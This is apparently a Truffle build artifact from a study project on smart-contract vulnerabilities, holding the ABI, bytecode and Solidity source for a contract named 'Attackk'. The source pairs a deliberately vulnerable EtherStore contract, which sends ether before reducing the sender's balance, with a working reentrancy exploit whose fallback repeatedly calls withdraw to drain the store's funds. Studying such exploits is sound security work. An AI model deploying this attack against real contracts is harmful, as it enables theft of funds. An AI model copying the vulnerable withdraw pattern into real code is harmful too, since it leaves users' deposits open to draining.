{
  "contractName": "Attackk",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherStoreAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "etherstore1",
      "outputs": [
        {
          "internalType": "contract EtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "getbalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516103cf3803806103cf8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061033b806100946000396000f3fe6080604052600436106100385760003560e01c80634d9b3d5d146101175780638d97c316146101425780639e5faafc1461019957610039565b5b670de0b6b3a76400006000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110610115576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156100fc57600080fd5b505af1158015610110573d6000803e3d6000fd5b505050505b005b34801561012357600080fd5b5061012c6101a3565b6040518082815260200191505060405180910390f35b34801561014e57600080fd5b506101576101ab565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101a16101d0565b005b600047905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76400003410156101e557600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561025657600080fd5b505af115801561026a573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156102eb57600080fd5b505af11580156102ff573d6000803e3d6000fd5b5050505056fea264697066735822122091204785a46f704b22af1f0b21fcf520a180b3742043ea8f6640602a4cf528e264736f6c634300060a0033",
  "immutableReferences": {},
  "source": "//SPDX-License-Identifier:MIT\r\npragma solidity 0.6.10;\r\n\r\ncontract EtherStore{\r\n   \r\n   mapping(address=>uint) public balances;\r\n\r\n   uint public x = 10;\r\n\r\n   function deposit() public payable{\r\n    balances[msg.sender]+=msg.value;\r\n   }\r\n\r\n   function withdraw(uint _amount) public payable {\r\n    require(balances[msg.sender]>=_amount);\r\n\r\n    (bool sent ,) =msg.sender.call{value:_amount}(\"\");\r\n     require(sent , \"Failed to send ether\");\r\n    balances[msg.sender]-=_amount;\r\n\r\n   }\r\n\r\n   function getBalance() public view returns(uint){\r\n        return address(this).balance;\r\n    }\r\n\r\n}\r\n\r\ncontract Attackk{\r\n    EtherStore public etherstore1;\r\n\r\n    constructor (address _etherStoreAddress) public {\r\n        etherstore1 = EtherStore(_etherStoreAddress);\r\n    }\r\n\r\n    fallback() external payable {\r\n        if(address(etherstore1).balance >= 1 ether){\r\n            etherstore1.withdraw(1 ether);\r\n        }\r\n    }\r\n\r\n    function attack() external payable{\r\n        require(msg.value>=1 ether);\r\n\r\n        etherstore1.deposit{value : 1 ether}();\r\n        etherstore1.withdraw(1 ether);\r\n    }\r\n\r\nfunction getbalance() public view returns(uint) {\r\n    return address(this).balance;\r\n}\r\n\r\n} \r\n",
  "sourcePath": "D:\\Solidity\\smart contract vulnerabilities\\reentrancy\\contracts\\reentrancy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.10+commit.00c0fcaf.Emscripten.clang"
  },
  "schemaVersion": "3.4.10",
  "updatedAt": "2022-11-09T16:20:53.319Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}